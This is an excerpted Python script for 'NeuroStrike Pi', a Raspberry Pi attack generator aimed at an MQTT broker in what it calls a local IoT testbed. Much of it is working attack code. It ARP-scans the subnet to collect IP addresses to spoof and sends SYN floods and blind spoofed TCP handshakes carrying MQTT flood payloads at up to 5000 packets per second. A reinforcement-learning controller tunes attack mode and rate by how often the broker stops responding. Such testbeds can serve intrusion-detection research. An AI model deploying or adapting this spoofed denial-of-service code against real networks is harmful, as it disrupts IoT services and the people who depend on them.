#!/usr/bin/env python3
"""
NeuroStrike Pi v2 final

This script is a Raspberry Pi–based real-time MQTT/TCP attack generator with an
embedded reinforcement learning controller. It is designed to run on a Pi inside
a local IoT testbed and automatically discover the active network environment
before launching spoofed traffic toward an MQTT broker.

Main functions
--------------
1. Network discovery
   - Detects the Pi’s active IP address and interface.
   - Scans the local subnet using ARP.
   - Selects the MQTT broker from a forced broker IP 
   - Builds a pool of discovered IoT device IPs that can be used as spoofed
     source addresses.

2. Attack generation
   - Supports five base attack profiles:
       * SYN TCP flooding
       * Basic connect flooding
       * Delayed connect flooding
       * Invalid subscription flooding
       * CONNECT flooding with WILL payload
   - Builds additional blended modes by combining pairs of base attacks using
     different ratios, giving a total of 35 attack modes.
   - Sends packets using a persistent Scapy Layer-3 socket for higher throughput
     than repeated per-packet send calls.
   - Spoofs source IPs and varies packet parameters such as ports, timing, TCP
     window size, and MQTT payload content.

3. Broker probing and RTO tracking
   - Independently probes the broker using a real TCP connect() from the Pi’s
     actual IP address.
   - Measures connect latency and success rate to estimate broker reachability.
   - Computes SRTT, RTTVAR, and RTO using RFC 6298-style updates.
   - Writes:
       * a rolling RTT window file for the latest probe samples
       * an append-only RTO log for later analysis

4. Reinforcement learning control
   - Encodes the current attack mode and runtime telemetry into a fixed state vector.
   - Chooses actions that change both attack mode and packet rate.
   - Uses probe success/failure, response time, suppression, and persistence in a
     poor-performing mode to compute reward.
   - Learns online and periodically saves model weights.

5. Live dashboard
   - Displays discovered hosts, broker status, spoofable IPs, current attack mode,
     packet rate, throughput, probe success, RTO statistics, and RL decisions.
   - Allows manual control of attack state, rate, mode, RL enable/disable, and
     manual network rescanning.

Files written
-------------
- RL weights:     /home/pi/neurostrike/rl_weights.pkl
- RTT window:     /home/pi/neurostrike/rtt_window.json
- RTO log:        /home/pi/neurostrike/rto_log.jsonl
- RL action log:  /home/pi/neurostrike/rl_log.jsonl

Run
---
sudo python3 neurostrike_pi_deployment.py
...
try:
    from scapy.all import IP, TCP, Raw, ARP, Ether, send, srp, conf
    conf.verb = 0
    # Keep L3 socket open between calls to avoid per-packet socket overhead
    _l3socket = conf.L3socket()
except ImportError:
...
MODEL_DIR      = "/home/pi/neurostrike_models"
...
RL_LOG_PATH     = "/home/pi/neurostrike/rl_log.jsonl"
...
BROKER_PORT       = 1883
FORCED_BROKER_IP   = "192.168.0.134"   # definite broker target
MAX_PPS           = 5000   # raw AF_PACKET socket ceiling
MIN_PPS           = 50     # minimum rate — below this RL has no meaningful signal
PPS_STEP          = 250    # RL action step size
...
class NetworkDiscovery:
    ...
    def _arp_scan(self, subnet):
        ...
        try:
            ans, _ = srp(
                ...
                timeout=2, verbose=False, iface=self.iface
            )
    ...
    def _scan(self):
        ...
        hosts = self._arp_scan(subnet)

        broker = None

        # Definite broker selection for reproducible experiments
        if FORCED_BROKER_IP:
            broker = FORCED_BROKER_IP
            if broker not in hosts:
                hosts.append(broker)
        else:
            for h in hosts:
    ...
    def full_status(self):
        with self._l:
            recent_rate = (
                ...
                if self.recent else
                (1.0 if self.connect_ok else 0.0)
            )

            lifetime_rate = self.ok_count / max(self.probe_count, 1)
            ...
            return {
                ...
                "success_rate":       recent_rate,     # use recent rate for dashboard/RL
...
# SCAPY L3 SENDER
# ============================================================================
# Uses Scapy's L3 socket kept open between calls to avoid per-packet socket
# overhead. Operates at Layer 3 — IP/TCP checksums computed automatically,
# packets reach the broker correctly unlike AF_PACKET Layer 2 injection.
# Persistent L3 socket gives ~3-5x improvement over basic send() calls.
# ============================================================================

_l3_lock = threading.Lock()

def _send_l3(pkt):
    """Send via persistent L3 socket with lock for thread safety."""
    global _l3socket
    try:
        with _l3_lock:
            _l3socket.send(pkt)
...
def send_packet(row, attack_name: str, iface: str) -> int:
    """
    Send spoofed attack packet via Scapy L3 socket.
    L3 operates at IP layer — checksums computed automatically,
    packets routed correctly through the kernel network stack.
    Source IPs spoofed to discovered IoT device addresses.
    """
    broker = disc.broker_ip
    if not broker:
        return 0
    ...
    try:
        ...
        if attack_name == "SYN_TCP_Flooding":
            ...
            pkt = (IP(src=src_ip, dst=broker, ttl=ESP32_TTL) /
                   TCP(sport=src_port, dport=BROKER_PORT, flags="S",
                       seq=isn, ack=0, window=win,
        ...
        # ── All MQTT attacks — blind 3-packet handshake ───────────────────────
        mqtt    = PAYLOAD_FN[attack_name]()
        isn     = random.randint(1_000_000, 3_000_000_000)
        cli_seq = isn + 1

        syn_pkt = (IP(src=src_ip, dst=broker, ttl=ESP32_TTL) /
                   TCP(sport=src_port, dport=BROKER_PORT, flags="S",
                       seq=isn, ack=0, window=win,
                       options=[("MSS", ESP32_MSS), ("SAckOK", b"")]))

        ack_pkt = (IP(src=src_ip, dst=broker, ttl=ESP32_TTL) /
                   TCP(sport=src_port, dport=BROKER_PORT, flags="A",
                       seq=cli_seq, ack=1, window=win))

        data_pkt = (IP(src=src_ip, dst=broker, ttl=ESP32_TTL) /
                    TCP(sport=src_port, dport=BROKER_PORT, flags="PA",
                        seq=cli_seq, ack=1, window=win) /
                    Raw(load=mqtt))

        nb  = _send_l3(syn_pkt)
        nb += _send_l3(ack_pkt)
        nb += _send_l3(data_pkt)
        return nb
    ...
    def record(self, nb, is_hs):
        ...
        with self.lock:
            if nb > 0:
                ...
                self.errs += 1
                if is_hs: self.hs_fail += 1
            c = now - 2.0
            while self._wt and self._wt[0] < c:
                self._wt.pop(0); self._wb.pop(0)
            # Cap list size at 10000 to prevent memory growth at very high PPS
            if len(self._wt) > 10000:
                self._wt = self._wt[-5000:]
                self._wb = self._wb[-5000:]
            n = len(self._wt)
            if n >= 2:
                sp = self._wt[-1] - self._wt[0]
                if sp > 0: self.pps = n / sp; self.bps = sum(self._wb) / sp
            tc = now - THROUGHPUT_WINDOW
            while self._tput_times and self._tput_times[0] < tc:
                self._tput_times.pop(0)
...
def sender_t(st: State, mc: ModelCache, sb: SampleBuffer, probe: BrokerProbe):
    """
    Smooth sender thread with busy-wait rate control.
    time.sleep() has ~1ms minimum resolution on Linux — at 1000 PPS target
    you need 1ms between packets which sleep cannot hit reliably.
    Busy-wait burns CPU but achieves accurate sub-millisecond timing.
    Hybrid approach: sleep for gaps > 2ms, busy-wait for gaps <= 2ms.
    Probe status updated every 100 packets to reduce lock contention.
    """
    ...
    while True:
        ...
        # Update probe status every 100 packets instead of every packet
        ...
        nb = send_packet(row, src, iface)
        st.record(nb, is_mqtt)

        # Rate control: sleep for long gaps, busy-wait for short gaps
        elapsed   = time.perf_counter() - t0
        remaining = inter_packet - elapsed
        if remaining > 0.002:
            time.sleep(remaining - 0.001)
        deadline = t0 + inter_packet
...
def rl_t(st: State, agent: RLAgent, fb: ProbeBasedFeedback, probe: BrokerProbe):
    ...
    while True:
        ...
        rew  = agent.reward(snap, cf, current_broker_up)
        ...
        try:
            with open(RL_LOG_PATH, "a") as f:
                f.write(json.dumps({
                    ...
                    "prev_mode": mi,
                    "new_mode": new_mi,
                    "prev_mode_label": ALL_MODES[mi]["label"],
                    "new_mode_label": ALL_MODES[new_mi]["label"],
                    "prev_pps": pps,
                    "new_pps": new_pps,
                    "pps_delta": pps_d,
                    "reward": rew,
        ...
        if rl:
            ...
            if pps_d != 0:
                rsn.append(f"PPS {'↑' if pps_d > 0 else '↓'}{new_pps}")
            if not current_broker_up:
...
def dashboard(scr, st: State, agent: RLAgent, mc: ModelCache, rto: RTOTracker):
    ...
    while True:
        ...
        s(ln, 0, f"Broker      : ", W)
        b_str = f"{broker_str}:{BROKER_PORT}  connect={b_rtt:.0f}ms  ok={b_rate*100:.1f}%"
...
def main():
    for f in ["rto_log.jsonl", "rl_log.jsonl"]:
        open(f, "w").close()
    print("=" * 70)
    ...
    if not disc.wait_ready(timeout=30):
        ...
        print(f"  Forced    : {FORCED_BROKER_IP}")
    ...
    def _bye(sig, frm):
        ...
        print(f"  Packets: {st.sent:,}  Errors: {st.errs}")
    ...
    try:
        ...
        curses.endwin(); print(f"Dashboard error: {e}"); raise
    _bye(None, None)
